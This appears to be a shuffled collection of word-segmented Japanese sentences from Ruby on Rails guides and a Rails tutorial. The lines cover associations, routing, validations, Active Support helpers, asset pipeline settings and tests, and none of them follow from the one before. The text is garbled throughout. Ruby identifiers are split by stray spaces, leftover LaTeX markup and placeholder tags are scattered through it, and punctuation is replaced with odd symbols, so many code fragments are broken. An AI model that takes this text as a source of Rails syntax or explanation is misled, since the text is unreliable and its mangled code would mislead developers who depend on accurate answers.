関連 付け られ た オブジェクト が な い 場合 は ` nil ` を 返 し ま す 。
変数
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/ reachable▖ rb ` で す 。
これ は 2 とおり の 方法 で 実装 でき ま す 。
結果 、 最初 に 想像 し て い た とおり
#### `symbolize_keys ` と `symbolize_keys !
本 ガイド で は この 後 、 それぞれ の 関連 付け の 宣言 方法 と 使用 方法 に つ い て 詳し く 解説 し ま す 。
CSS の 読み込 み シーケンス の 中 で 、 \ kode {application ▖css } 自身 も インク ルード する こと を 指定 し て い ま す 。
ルート から users へ の ルーティング を 追加 する
    redirect_to @ article
簡素 化 の ため 、 次 の よう な Unix スタイル の プロンプト   ( 行 の 頭 に 「 \$ 」 を 表示 する スタイル )   を 使用 し て 、 その 例 が コマンドライン で あ る こと を 示 し て い ま す 。
この 行 は 使用 し な い こと 。
手動 で 画像 付き の 投稿 を し て み る と 、 図   \ ref { fig : micropost _with _ image } の よう に な り ま す 。
* * ` Rails : : Rack : : Logger` * *
メソッド
self ▖ default _ params   = {
リスト \ ref{ code :unicorn_config } で は 少し だけ コード の 見栄え を 修正 し て い ま す ▟ これ は 標準 的 な 1 行 80 文字 の 制限 に 合わせ る ため の 変更 で す 。
ステップ ファイル は \ kode {features/step_definitions } ディレクトリ に 置 き ま す ▟ ファイル 名 は ここ で は \ kode {authentication_steps▖rb } と し ま す 。
ログ イン リンク は \ ref{ sec : changing_ the_layout_links } で 動 く よう に し ま す ) 。
テンプレート の 拡張 子 を ` ▖builder ` に する と 、 ` xml ` と い う 名前 の Xml Markup オブジェクト が 自動 で 使用 でき る よう に な り ま す 。
#   Before   actions
( 既に Application コントローラ に \ kode {hello } アクション を 追加 し て い た 方 は 、 念 の ため 削除 し て お く と よ い か も しれ ま せ ん ) 。
*   モデル 間 の 関連 付け ( アソシエーション ) を 表現 する
* * N  +   1 クエリ 問題 を 解決 する * *
group   : production   do
\ href { http://mbsy▖co / 6 VQ 8l } { Code   School } :   プログラミング を 対話 的 に 学習 でき る コース
この ため 、 edit アクション や update アクション を テスト する 前 に ログ イン し て お く 必要 が あ り ま す 。
この メソッド で は 、 オブジェクト が コレクション 内 で 従 う 必要 の あ る 追加 条件 も 加味 さ れ ま す 。
数 分 待 っ て から ページ を 再度 読み込 む と 、 この テキスト は 自動 的 に 新し い 時間 に 基づ い て 更新 さ れ ま す 。
ルート ルーティング で 「 goodbye ,   world ! 」 を 表示 する よう 変更 する 。
送信 が 無効 の 場合 は 、 ログ イン   ( リスト \ ref{ code :correct_ login_failure} )   と 同様 に \ kode {new } ページ を 出力 し て \ kode {flash▖now } メッセージ を 表示 し ま す 。
    <%=   form _ for ( zone )   do  | f| %>
If   we  meet  some  day ,
*   refute で は な く assert_not を 使用 する こと 。
Home ページ   ( \ href { http://local host : 3000 / }{/})   に マイクロ ポスト の 投稿 フォーム を 追加 する
use   Rack : : MethodOverride
たとえば ` self▖serialized_attributes ` は ` self ▖ class▖serialized_attributes ` の よう に クラス メソッド と し て 使用 し て くださ い 。
" / Users/ryan/ Sites/side _projects/blorgh/test/dummy/app/views "    *
たとえば 、 以下 の コード が あ る と し ま す 。
####   面倒 な 方法
2 番 目 と 3 番 目 は メイン の \ kode {if } 文 の 2 つ の 分岐 に 対応 し ま す   ( リスト \ ref{ code : password _ reset_update_action } ) 。
     attr_ internal  : controller ,  :template
     admin ▖ validates :email ,   presence :  true
本番 アプリケーション の デプロイ 先 の システム に 既存 の Java Script ラン タイム が な い 場合 は 、 以下 を Gemfile に 記述 し ま す 。
以下 の モデル を 例 に と り ま す 。
それ ら を 確認 し て から 次 に 進 み ま しょ う 。
/about
Switched to   branch   'master '
   def  self ▖ default _scope
この よう に 、 \ kode {nil } オブジェクト 自身 は \ kode {empty ? } メソッド に は 応答 し な い に も かかわ ら ず 、 \ kode {nil ▖ to\_s } と する と 応答 する こと が わか り ま す 。
実際 の アプリケーション コード は わずか 1 行 で す 。
   username : blog
この 変更 は 、 ` Relation ` に 対 し て 直接 ミューテーター メソッド を 呼び出 す こと に よ る 奇妙 な バグ や 混乱 を 防止 する ため に 行 わ れ ま し た 。
   const _ name  =   path▖ demodulize
何 だ か たくさん の テキスト が 表示 さ れ ま し た 。
rails   new appname  -- skip- sprockets
      t▖ string   : name
以前 の Rails で は strip_tags ( ) 、 strip_links ( ) 、 sanitize ( ) メソッド で ブラック リスト 的 アプローチ が 使用 さ れ て い ま し た 。
他 も 同様 で す 。
` delegate ` マクロ に は 複数 の メソッド を 指定 でき ま す 。
     Article▖ published
          subject :  'Welcome to  My   Awesome  Site')   do  | format |
エンジン は アプリケーション の 動作 を 大幅 に 変更 する もの で は な く 、 アプリケーション を 単に 拡張 する もの で す 。
メソッド を 用い ま す ▟ \ ref{ sec : modifying _built_ in_classes } の 終わり に 見 ま し た ) 。
some_klass ▖ acts_ like ?(:string )
リスト \ ref{ code :micropost _ordering } の コード を 追加 する こと で 、 テスト スイート は   \ passing   に な る はず で す 。
###   土台 を 設置 する
0 ▖ ▖ 7 )     # => true
    when  ' Bad  User '
###   名前 付き 関連 付け の 配列 / ハッシュ を 使用 する
この ` author_ class ` メソッド は 常 に ` Class ` オブジェクト を 返 す 必要 が あ り ま す 。
これ で 、 リスト \ ref{ code : friendly _ forwarding _ test } の フレンド リー フォワーディング 用 統合 テスト は パス する はず で す ▟ 成功 すれ ば 、 基本 ユーザー 認証 機能 と ページ 保護 機能 の 実装 は 完了 で す 。
`blog ` ディレクトリ に 移動 し 、 以下 の コマンド を 実行 し ま す 。
テスト を 変更 ファイル だけ で は な く 、 \emph { フル } で 実行 し た い 場合 は 、 \ kode { guard > } プロンプト で Return キー を 押 し ま す
  ( end ) ╼╼\ section { アカウント を 有効 化 する } %  ( fold) ╼\ label{ sec : activating_ the_account} ╼╼
string ' ,  ' foo' )
( 一般 に 、 ファイル や ディレクトリ が うま く 表示 さ れ て い な い 場合 は この よう に ファイル ツリー を 再 表示 し て み て くださ い ) 。
def load _mis sing_ constant ( from _mod ,   const _ name )
これ は リスト \ ref{ code :relationships_belongs_to_test } で 使用 さ れ て い ま し た 。
また 、 User モデル に \ kode { has_ secure_ password } を 追加 し た 効果 に つ い て も   ( たとえば \ kode {authenticate } メソッド の 効果 など も )   具体 的 に 見 て い き ま す 。
続 い て 、 メール の リンク を 開 い て 無効 な 情報 を 送信 し 、 次 に その リンク から 有効 な 情報 を 送信 し て 、 それぞれ が 期待 どおり に 動作 する こと を 確認 し ま す 。
( 今 は この コード の 意味 が わか ら な く て も 問題 あ り ま せ ん 。
        force     config/ routes▖rb
hash = { a :   1 ,  b :   2 }
ドキュメント も 更新 する 必要 が あ る か 。
self を 省略 し た 結果 を リスト \ ref{ code :micropost _ partial } に 示 し ま す 。
###  ヘッダー の 値 を 自動 エンコード する
`find ` メソッド を 使用 する と 、 与え られ た どの オプション に も マッチ する   _ 主キー _   に 対応 する オブジェクト を 取り出 す こと が でき ま す 。
{ 0 } { 1 } 第 8 章 { / 1 } { / 0 } で は 、 この \ kode {authenticate } メソッド を 使 っ て ログ イン する 方法 を 解説 し ま す 。
       your  username  is : <%= @user▖ login  %>▖<br>
    </ul>
たとえば ` northwest _` を 指定 する と 、 Customer クラス は ` northwest _customers ` を テーブル と し て 探 し ま す 。
ただし 、 ハッシュ の 場合 は 若干 異な り ま す 。
テスト が   \ passing   に な る ため に は 、 パスワード の バリデーション に 対 し て 、 空 だっ た とき の 例外 処理 を 加え る 必要 が あ り ま す 。
以下 は デフォルト の 接続 設定 ファイル ( ` config/ database▖yml ` ) に 含 ま れ る 、 開発 環境 用 の 接続 設定 で す 。
また 、 有効 な ユーザー 情報 を 送信 し て も 新し い ユーザー が 実際 に 作成 さ れ る こと も あ り ま せ ん 。
radio_button_tag   ' gender ' ,  'male'
作成 し た コード を リスト \ ref{ code : log _out_with _test _ close _browser } に 示 し ま す
これ に よ っ て 生成 さ れ る ルーティング は 、 最初 の 例 と 完全 に 同じ で す 。
assemblies▖ clear
   belongs_to   : supplier
この ヘルパー は 、 属性 の 値 の 長 さ を 検証 し ま す 。
*   クッキー に セッション を 保存 する よう に し ま す 。
現在 は この オプション を 設定 し て も 何 も 変わ り ま せ ん 。
展開 さ れ た アプリケーション が 期待 どおり に 動作 する ため に 、 SSL が 本番 環境 で 動作 する ため の 行 を 1 つ 追加 し ま す 。
has_many : comments
#   以下 の どちら に な る か は 一定 で は な い
( \ ref{ sec : adding _ to_ the_layout } で も 説明 し た よう に 、 Rails の オプション ハッシュ は 繰り返 し 登場 する テーマ で す ) 。
さっそく 、 ログ インフォーム の 送信 に つ い て 簡単 な 統合 テスト を 作成 する こと から 始め ま しょ う 。
Rails ▖ application▖ config▖ action_dispatch▖ cookies_serializer  = :hybrid
` NameError ` の 拡張
      else
#   SELECT   DISTINCT   role   FROM   clients
##### ` collection ( force_ reload   =  false ) `
`uniq ` メソッド は 、 コレクション 内 の 重複 を 削除 し ま す 。
* `index▖html ▖erb `
新し い セッション 用   ( サイン イン )
" Person " ▖tableize      # =>  " people "
統合 テスト が 成功 し た ら 、 今度 は すべて の テスト を 流 し て   \ passing   する か どう か 確かめ て み て くださ い 。
def  counter_cache_column
Client ▖ w here ( " orders_count  = ? " ,   params [ : orders ] )
         template_name :  'another ' )
なお 、 ファクトリー で は 以下 の オプション を 使用 でき ま す 。
*   等号 の 前後 に は スペース を 置 く ▟ 「 `a = b ` 」 で は な く 「 ` a =  b ` 」 と する こと 。
`end _of_day ` メソッド は 、 その 日 の 最後 の 時点   ( 23 : 59 : 59 )   の タイム スタンプ を 返 し ま す 。
Global ID
{ a :   1 ,  b :   2 } ▖ with _indifferent_access▖slice ( " a " )
Client▖ distinct ▖ pluck(:role )
c ▖ first _ name  =  ' Manny'
{ 0 } リスト 8 ▖ 3 : {/ 0 } ╼╼ { 1 } リスト \ ref{ code : login_form } で 生成 し た ログ インフォーム の HTML ╼ { / 1 }
インスタンス 述語 が 不要 な 場合 、 ` instance_ predicate:  false ` を 指定 すれ ば 定義 さ れ な く な り ま す 。
Rails   3 で は 常 に 406   Not   Acceptable が 返 さ れ ま す 。
( クラウド IDE の 場合 は 、 ファイル ナビゲーター で 矢印 を クリック し て サンプル アプリ の ディレクトリ を 開 き 、 \ kode { Gemfile } アイコン を ダブル クリック し ま す ) 。
{ a :   1 } ▖ with _indifferent_access ▖ except(:a)   # => {}
Article ▖ w here ▖ not ( author :   author )
$  rails  -- version
*  `config▖ active_ record ▖ record_timestamps ` は 、 モデル で 発生 する ` create ` 操作 や ` update ` 操作 に タイム スタンプ を 付け る か どう か を 指定 する 論理 値 で す 。
この リクエスト は 、 特定 の コントローラ 内 アクション に マッチ さ せ る よう ルーター に 要求 し て い ま す 。
    <th ></th >
本番 環境 で は SSL を 使 う よう に 修正 する
` instance_ values ` メソッド は ハッシュ を 返 し ま す ▟ インスタンス 変数 名 から " @ " を 除 い た もの が ハッシュ の キー に 、 インスタンス 変数 の 値 が ハッシュ の 値 に マップ さ れ ま す 。
パスワード
新し い Micropost オブジェクト を 返 す   ( \kode {user_ id   =  user ▖ id } ) 。
なお 、 \ kode {activation\_token } は 仮 の 属性 で しか な い の で   ( \ ref{ sec : account_activations _ resource } ) 、 データベース の ユーザー は この 値 を 実際 に は 持 っ て い ま せ ん 。
作成 し た コード を リスト \ ref{ code :remember_digest _ should _ not_be_blank } に 示 し ま す
-----
上 の コード に よ っ て 以下 が 生成 さ れ ま す 。
` validates_associated ` の デフォルト エラー メッセージ は  _ " is   invalid " _  で す 。
\ kode {image\_tag } の 効果 を 確かめ る ため に 、 ブラウザ から 生成 さ れ た HTML を 見 て み ま しょ う
Rails 貢献 者 が ドキュメント を 作成 する 場合 、 その API を 外部 開発 者 に 公開 し て よ い か どう か に 常 に 注意 を 払 う 必要 が あ り ま す 。
*  `collection ▖empty?
self を 省略 し た 結果 を リスト \ ref{ code : updated_error _messages_ partial } に 示 し ま す 。
" following "   関連 の メソッド  
#   order   by   providing   the  seed ,  which   is   printed   after  each   run▖
この 定義 が どの よう に 読み込 ま れ る か を 見 て み ま しょ う 。
` : instance_ reader ` が `false ` の 場合 、 インスタンス 述語 は reader メソッド と 同様 に ` NoMethodError ` を 返 し ま す 。
#      2 ▖even ?  
` config▖ action _mailer ` に は 多数 の 設定 オプション が あ り ま す 。
デフォルト で は 、 ▖ coffee ファイル と ▖ scss ファイル は 自動 で は プリ コンパイル さ れ ま せ ん 。
Rails は 最初 に この テンプレート を 探 し ま す 。
Rails で サポート さ れ て い る 関連 付け は 以下 の 6 種類 で す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ kernel/ reporting ▖ rb ` で す 。
新し い コントローラ の 作成 は 第 \ ref { cha :a_toy_ app } 章 で 行 い ま す 。
ハッシュ の 中 の ハッシュ
#   ユーザー 変数 を 作成 する ため の コード に 置き換え る 。
さらに 、 正し い URL か どう か を テスト する コード も 加え る と 、 リスト \ ref{ code : following _ tests } の よう に な り ま す 。
Passenger を 使用 する と 、 アプリケーション を サブ ディレクトリ で 実行 する の が 容易 に な り ま す 。
$ ('# logo') ▖ attr   src: "<%=   asset_path ( ' logo▖ png ')  %> "
Rails は 現在 の レイアウト を 探索 する 場合 、 最初 に 現在 の コントローラ と 同じ 基本 名 を 持 つ レイアウト が ` app/views/layouts ` ディレクトリ に あ る か どう か を 調べ ま す 。
NOTE :   この セグメント フォーマット を 必須 に し た い 場合 は 、 以下 の よう に ` format :  true ` を 指定 し ま す 。
use   ActionDispatch : : ShowExceptions
` : nodoc: ` の 追加 は 、 絶対 に 無断 で 行 わ な い で くださ い ▟ ドキュメント から その メソッド や クラス の 記述 が 失 わ れ て しま い ま す 。
location ~ ^/assets/ {
`try ` メソッド は 引数 の 代り に ブロック を 与え て 呼び出 す こと も でき ま す ▟ この 場合 オブジェクト が ` nil ` で な い 場合 に のみ ブロック が 実行 さ れ ま す 。
Active   Support で は この API を 拡張 し 、 より フル パス に 近 い ( qualified ) 定数 名 を 渡せ る よう に し て い ま す 。
    redirect_to   action :  'read_cookie '
----------------------------------------
Rails に お け る エンジン の 役割
\ kode {user_ id } が アクセス 不能 で あ る こと を 確認 する テスト 。
### ` has_and _belongs_to_many ` 関連 付け
Ruby の 経験 が まったく な い 場合 、 Rails を 学 ぶ の は かなり 大変 な 作業 に な る で しょ う 。
ユーザー と マイクロ ポスト を 関連 付け でき た こと を 思い出 し て くださ い 。
*  `config▖ action_controller ▖ permit_all_ parameters ` は 、 マス アサインメント さ れ る すべて の パラメータ を デフォルト で 許可 する こと を 設定 し ま す 。
#   JSON 用 に パラメータ を ラップ し ま す ▟ : format に 空 配列 を 設定 する こと で 無効 に でき ま す 。
先 に 進 む 前 に 、 Relationship モデル の 検証 を 追加 し て 完全 な もの に し て お き ま しょ う 。
I   shall  be   late ! " ▖ truncate ( 20 ,  omis sion :  '&hellip;')
    has _one   : account ,  -> {  w here   active :  true   }
たとえば 各 部分 の オプション 設定 を イニシャライザ に 保存 し て お き 、 フレームワーク と gem が すべて 読み込 ま れ た 後 に 適用 する こと が でき ま す 。
対象 と な る 文字 列 の うち 、 ` position ` で 指定 さ れ た 位置 に あ る 文字 を 返 し ま す 。
私 たち は 、 既に Capybara が Web 操作 の 文法 を 直感 的 に サポート し て い る ところ を 目の 当たり に し て き ま し た 。
  => false
以下 の 配信 方法 を 指定 可能 で す ▟ <ul >
` collection = ` メソッド は 、 指定 し た オブジェクト で その コレクション の 内容 を 置き換え ま す ▟ 元 から あ っ た オブジェクト は 削除 さ れ ま す 。
ところ で 、 公式 標準 に よ る と メール アドレス に 完全 に 一致 する 正規 表現 は 存在 する の だ そう で す ▟ しかし 、 苦労 し て 導入 する ほど の 甲斐 は あ り ま せ ん 。
####  JSON   gem の 互換 性
以下 の メソッド で は バリデーション が トリガ さ れ 、 オブジェクト が 有効 な 場合 に のみ データベース に 保存 さ れ ま す 。
この Java Script ファイル が な い と 、 ダイアログ ボックス は 表示 さ れ な く な り ま す 。
module  N
詳細 に つ い て は 、 [ Rails 国際 化   ( I18 n )   API ] ( i 18 n ▖html )   を 参照 し て くださ い 。
| ----------------------- | --------------------------------------------------------------------------------- |
アセット パイプライン と は 、 Java Script や CSS の アセット を 最小 化   ( minify :   スペース や 改行 を 詰め る など )   また は 圧縮 し て 連結 する ため の フレームワーク で す 。
{ 0 } 図 5 ▖ 8 { / 0 }   { 1 } \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000/about}{/about } で 表示 さ れ る About ページ { / 1 }
なお { 0 } { 1 } 第 6 章 { / 1 } { / 0 } で も 、 以下 の よう に \emph { モデル } を 自動 生成 する 方法 を 紹介 し ま す 。
これ で Ruby の 生 の オブジェクト 出力 が 整形 さ れ 、 作者 名 が 表示 さ れ る よう に な り ま す 。
>> p ▖new_ record ?
User モデル に ユーザー 有効 化 用 の 属性 を 追加 する
/application ▖ ( css |js) $/ ]
この クエリ 文字 列 ベース の 戦略 に は 多く の 問題 点 が あ り ま す 。
Java Script で 使用 でき る ディレクティブ は スタイル シート で も 使用 でき ま す   ( なお Java Script と 異な り スタイル シート は 明示 的 に インク ルード さ れ る と い う 違い が あ り ま す ) 。
{ 0 } 図 11 ▖ 16 { / 0 }   { 1 } マイクロ ポスト の 削除 リンク と 試作 フィード の モックアップ { / 1 }
###   名前 付き ヘルパー を オーバーライド する
 * = require_ self
     create_table  : orders  do  | t |
       create      app/views/users/show ▖json▖jbuilder
その ため の ビュー を 作成 し 、 ` Comments Controller ` に ` destroy ` アクション を 作成 する 必要 が あ り ま す 。
|   ファイル / ディレクトリ                                |  目的                                   |
最初 に 、 有効 な メール アドレス と 無効 な メール アドレス の コレクション に 対 する テスト を 行 い ま しょ う 。
|   PATCH / PUT  | / kategorien/:id             |  categories #update  |  category _ path(:id )       |
セッション を 破棄 する \ kode { destroy } アクション も 、 引き続 き 同じ 要領 で 作成 する こと に し ま す 。
$  rake
\ kode {index } アクション で Users を ページ ネート する
つまり 、 以下 の よう に ピンポイント で require を 実行 する こと が でき ま す 。
こう する こと で 共通 の トピック ブランチ を 使え る よう に な り 、 便利 で す 。
これ に よ り 、 それぞれ の 例 の 前 に ルート パス へ の アクセス を 実行 し ま す
そこ で 、 以下 の コード を ` title ` フィールド の すぐ 上 に 追加 し ま す 。
### ` has_and _belongs_to_many ` 関連 付け の 詳細
これ ら の クラス で は 、 ` validate ` メソッド が 実装 さ れ て い る 必要 が あ り ま す ▟ この メソッド は レコード を 1 つ 引数 に 取 り 、 それ に 対 し て バリデーション を 実行 し ま す 。
#    polymorphic_url( record )   #  same as  comment_url( record )
app/assets/javascripts/home ▖js
*  `redirect_to ` を 呼び出 し 、 HTTP リダイレクト コード ステータス を ブラウザ に 送信 する
この 時点 で 、 master ブランチ に 変更 を 取り込 む 準備 が でき ま し た 。
\emph { Ruby   on   Rails チュートリアル }   の モックアップ は 、 「 \ href { http://gomockingbird ▖ com} { Mockingbird } 」 と い う 素晴らし い モックアップ 作成 サービス で 作 ら れ て い ま す 。
$   cat ~/▖ssh/id _rsa ▖ pub
Rails の キャッシュ ストア は 、 Sprockets を 使用 し て development 環境 と production 環境 の アセット を キャッシュ を 使用 し ま す 。
person ▖errors [ : name ]
Factory   Girl で シーケンス を 定義 する 。
フッター パーシャル \ kode {_ footer ▖html ▖erb } に も リンク が あ り ま す ▟ これ ら は About ページ と Contact ページ へ の リンク で す   ( リスト \ ref{ code : footer_ partial_links} ) 。
#### escape_ javascript
受動 的 関係 を 使 っ て \ kode {user ▖ followers } を 実装 する
上 の コード を 有効 に する に は 、 ` application ▖rb ` の 設定 オプション に 新し い オブジェクト を 渡 し ま す 。
< h 1 >Edit  article </ h 1 >
#   アカウント を 有効 に する
テスト が 重要 で あ る と い う 点 で は Rails 開発 者 の 意見 は ほぼ 一致 し て い ま す が 、 細か い 点 で は 異論 が 生 じ て い る の も 確か で す 。
      invoke   rspec
\ kode {before_ save } コール バック の 別 の 実装  
module   BangBang
アカウント を 有効 化 する 段取り は 、 ユーザー ログ イン   ( \ ref{ sec : logging _ in } ) 、 特に ユーザー の 記憶   ( \ ref{ sec : remember_me})   と 似 て い ま す 。
|  HTTP   動詞   |   パス                   |  コントローラ # アクション    |   名前 付き ヘルパー               |
self を 省略 し た 結果 を リスト \ ref{ code : add_remember_digest_to_users _ generated } に 示 し ま す 。
delegate  : street ,  to : : address ,   prefix :   true
この 方法 なら 記述 が 短 く て 済 み 、 意味 も はっきり し ま す 。
関連 付け プロキシ の 内部 を 参照 する に は 、 ` proxy _ association ` アクセサ に あ る 以下 の 3 つ の 属性 を 使用 し ま す 。
また 、 上 の コード で は ユーザー 名 を 書 い て い ま し た が 、
$   rmdir  workspace/
これ は 、 ` Engine ` クラス 内 の ` isolate_namespace ` 呼び出し に よ っ て 実現 さ れ ま す 。
これ は リスト \ ref{ code : add_activation_to_users _migration } で 使用 さ れ て い ま し た 。
belongs_to  : author ,   class_ name :  " User "
#####  ` ago` 、 ` since `
上 の 例 の 場合 、 Order クラス は 、 関連 付け られ て い る Customer の タイム スタンプ を 保存 時 また は destroy 時 に 更新 し ま す 。
scaffold で 生成 さ れ た スタイル を 適用 する に は 、 この レイアウト の ` < head > ` タグ に 以下 の 行 を 挿入 し ま す 。
これ は リスト \ ref{ code : sample_relationships } で 使用 さ れ て い ま し た 。
end _of_month   ( at_end _of_month )
article   GET     /articles/: id ( ▖: format )        articles # show
これ は リスト \ ref{ code :remember_test } で 使用 さ れ て い ま し た 。
Rails の ビュー で は 、 静的 HTML の 他 に ERB   ( 埋め込 み Ruby :   Embedded  RuBy )   も 使用 でき る 。
#   今後 の ミューテーター 呼び出 し 方法
この 設定 は 、 特に Active   Record の 設定 に 使用 さ れ ま す 。
エイリアス チェーン が 行 わ れ る 対象 を 特徴 付け る ラベル が 選 ば れ る とき に その よう な 衝突 を 回避 する に は 、 次 の よう に し ま す 。
     config▖ action _mailer▖ default _options  = {
" foo\n \nbar " ▖indent ( 2 ,  nil ,  true )  # => "    foo\ n   \n    bar "
  >>  x   - =   7
Microposts リソース の 開発 で は 、 Microposts コントローラ 内 の アクセス 制御 から 始め る こと に し ま しょ う 。
   self ▖ include _root_ in_json  =  false
collection ルーティング で も member ルーティング の とき と 同様 に ` : on ` オプション を 使用 でき ま す 。
Active   Record の ` new_ record ? ` インスタンス メソッド を 使用 し て 、 オブジェクト が 既に データベース 上 に あ る か どう か を 確認 でき ま す 。
Ruby   1 ▖ 9 の ` prev_ year ` メソッド と ` next _ year ` メソッド は 、 それぞれ 昨年 と 来年 の 同じ 日 と 月 を 返 し ま す 。
新規 ユーザー を 作成 する ページ
    i ▖ save !
*   ハッシュ の 記法 は   Ruby   1 ▖ 9   以降 の 書式 を 使用 する 。
###  デフォルト スコープ の 変更
Rails で は バリデーション を 簡単 に 利用 でき る よう 、 一般 に 利用 可能 な ビルト イン ヘルパー が 用意 さ れ て お り 、 自前 の バリデーション メソッド を 作成 する こと も でき る よう に な っ て い ま す 。
` to _ formatted_s ` メソッド は 、 デフォルト で は ` to_s ` と 同様 に 振る舞 い ま す 。
|  key  | key_ len  |  ref   |  rows |   Extra       |
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/try ▖ rb ` で す 。
@ see _more   =  videos▖ many ?  
*   この テスト で 自分 は 幸せ に なれ る か 。
yield(:content )  : yield %></div>
#      1 ▖odd ?   
SELECT  *  FROM   clients  LIMIT   1
mail   =   Notifier ▖ notify ( user ,  ▖▖▖)  
end  
C ▖ new ( 0 ,   1 ) ▖ instance_ variable_names # => [ "@ x " ,  "@y " ]
         format ▖ js   {}
M ▖ parent       # =>  X : : Y
< /tr>
テキスタイル プロセッサ に よ っ て 作成 さ れ て い な い HTML を 除去 する に は 、 : filter_html オプション を 使用 し て くださ い 。
まず は フォーマット の バリデーション を 反映 する ため に は 、 \ kode {file\_field } タグ に \ kode { accept } パラメータ を 付与 し て 使 い ま す 。
` development ▖ rb ` の 場合 。
もし OS   X の \ href { http://brew▖sh/}{ Homebrew } が 使え る よう に な っ て い れ ば 、 \ kode { brew install  curl} と い う コマンド を 打 っ て \ kode { curl} を インストール する こと が でき ま す 。
*  `collection << (object ,  ▖▖▖)
上 の マイ グレーション ファイル に は ` change ` と い う 名前 の メソッド が 作成 さ れ て お り 、 マイグレーション の 実行 時 に 呼び出 さ れ ま す 。
その コード に 、 以下 の 行 が あ る こと に 注目 し て くださ い 。
新し い セッション の 作成   ( ログ イン )
リスト \ ref{ code :micropost_dependency } の コード が 正し く 動 い て い れ ば 、 テスト が   \ passing   する よう に な り ま す 。
       method
create     test/controllers/welcome_controller_test ▖ rb
アカウント 有効 化 や パスワード 再 設定 で は 、 ユーザー を 有効 化 し たり パスワード を 再 設定 する ため に 一意 の URL を 作成 する ▟ 一意 の URL に は 生成 し た トークン が 使用 さ れ る 。
true に 設定 する と 、 Customer クラス が 使用 する テーブル 名 は 複数 形 の ` customers ` に な り ま す ( デフォルト ) 。
ファイル が いく つ か 削除 さ れ ま し た が 、 この 変更 が 行 わ れ た の は 現在 の 「 作業 ツリー 」 内 のみ な の で 、 まだ コミット   ( 保存 )   さ れ て い ま せ ん 。
" b " ,   " r " ,   " o " ,   " f " ,   " e " ,   " w " ,  " v " ,   " m " ,   " a " ,   " x " ,   " p " ]
( 緑色 の ウェルカム メッセージ は 、 { p 0 } で 解説 する { 2 } flash{ / 2 } と い う 機能 を 使用 し て 表示 し て い ま す ) 。
                         dependent :  : destroy  
この 改造 が 終わ る と 、 デフォルト の Rails ページ は 図 \ ref { fig: riding _ rails } の よう に 「 hello ,   world 」 ページ が 表示 さ れ ま す ▟ これ が この セクション で の 目標 で す 。
詳細 に つ い て は GitHub に 投稿 さ れ た 「 \ href {https://github▖ com/blog / 926 - shiny- new- commit - styles } { 最新 の コミット 方法 }   ( 英語 ) 」 を 参照 し て くださ い 。
対応 し て い る 科目 は Ruby   on   Rails 、 フロント エンド 開発 、 Web デザイン 、 データ サイエンス で す 。
( これ で 、 HTML ビュー の ファイル の 拡張 子 が \ kode {▖html ▖erb } と な っ て い る 理由 を お わか り いただけ た と 思 い ま す ) 。
  $ < エディタ 名 >  ▖
最後 に \ kode { heroku  create } コマンド を 実行 し て 、 Heroku サーバー に サンプル アプリケーション の 実行 場所 を 作成 し ま す   ( リスト \ ref{ code : heroku_create} ) 。
*  `set_load _ path` :   この イニシャライザ は ` bootstrap_hook ` より 前 に 実行 さ れ ま す 。
ファイル ナビゲーター に あ る   ( あまり 目立 た な い )   ギア の アイコン
すべて の オブジェクト で 使用 でき る 拡張 機能
ビルト イン の バリデーション ヘルパー だけ で は 不足 の 場合 、 好み の バリ データ や バリデーション メソッド を 作成 し て 使用 でき ま す 。
    has_many  : line _items ,  -> { group  'orders▖ id ' } ,
HTML フォーム 要素 を グループ 化 する ため の fieldset タグ を 作成 し ま す 。
##### ` weeks_ago`
「 控えめ な Java Script 」
match  '/application ▖ js',  to :   Sprockets ,   via :  : all
これ が 、 " Ruby で は あらゆる もの が オブジェクト で あ る "   と い う こと の 技術 的 な 意味 で す 。
{ " title " = > " First   article ! " ,  " text " = > " This   is  my   first   article ▖ " }
megabytes
本 ガイド で は 、 コントローラ 、 ビュー 、 モデル に よ っ て 形成 さ れ る 三角 形 の うち 、 コントローラ と ビュー の 間 で の やりとり を 中心 に 扱 い ま す 。
<ul >< li >`: address` -  リモート の メール サーバー の 使用 を 許可 する 。
     sample  application ▖
( これ は 確か に 紛らわし い 点 で す )   。
      t▖ text   : description
# =>  Sun   Mar   28   0 1 : 59 : 59   + 0 100   2010
create      app/views/blorgh/articles/new▖html ▖erb
ターミナル   ( コマンド プロンプト と も 言 い ま す )   ウィンドウ を 開 い て くださ い 。
` Array ▖wrap ` メソッド は 、 配列 の 中 に あ る 引数 が 配列   ( また は 配列 の よう な もの )   に な っ て い な い 場合 に 、 それ ら を 配列 の 中 に ラップ し ま す 。
###  エンジン の 内部
class   Appointment <  ActiveRecord : : Base
javascript_ include_tag  : all
まず は 1 つ 目 の 違い に つ い て で す ▟ 以前 、 ユーザー と マイクロ ポスト の 関連 付け を し た とき は 、 次 の よう に 書 き ま し た 。
Rails に は \ kode { generate } と い う スクリプト が あ り 、 この スクリプト に コントローラ 名 を 入力 する だけ で 、 この 魔法 の よう な スクリプト が コントローラ を 作成 し て くれ ま す 。
{ 0 } 図 5 ▖ 1 { / 0 }   { 1 } サンプル アプリケーション の Home ページ の モックアップ { / 1 }
gem  ' coffee - rails '
ステップ 定義 は 正規 表現 マッチャー に よ っ て 繰り返 す こと が でき ま す が 、 この 手法 は 一般 に 厄介 な もの に な り やす い と い う 印象 で す 。
正規 表現 の 開始 を 示 す
> ,  '2009 - 0 0 8 '  => < Invoice   ▖▖▖
    has _one   : address
エラー メッセージ が 正し く 表示 さ れ て い る か どう か に つ い て は 、 演習 と し て 残 し て お き ま す   ( \ ref{ sec : signup _exercises} ) 。
     message▖ to  =  ['sandbox@ example ▖ com' ]
*   Active   Record の モデル を 関連 付け る さまざま な 方法
Active   Job で は Global ID が パラメータ と し て サポート さ れ て い ま す 。
#   トークン を 作成 する 。
    has_many  : line _items ,   inverse _of:  :order
アプリケーション の ログ イン の 挙動 を テスト する ため に 、 最初 に 統合 テスト を 生成 し ま す 。
デフォルト で 作成 さ れ る Relationship モデル と は 異な り 、 \ kode { followed_ id } のみ アクセス 可能 と な っ て い る 点 に 注意 し て くださ い 。
          subject :   " レンダリング し ま し た " )
   def  new_ registration ( user )
XML _TYPE_ NAMES  =  {
  # ▖▖▖
*  `config▖ mid dleware ▖ insert_after ( existing _ mid dleware ,   new_ mid dleware ,  args) ` -   ( 第 一 引数 で ) 指定 さ れ た ミドルウェア の 後 に 新し い ミドルウェア を 追加 し ま す 。
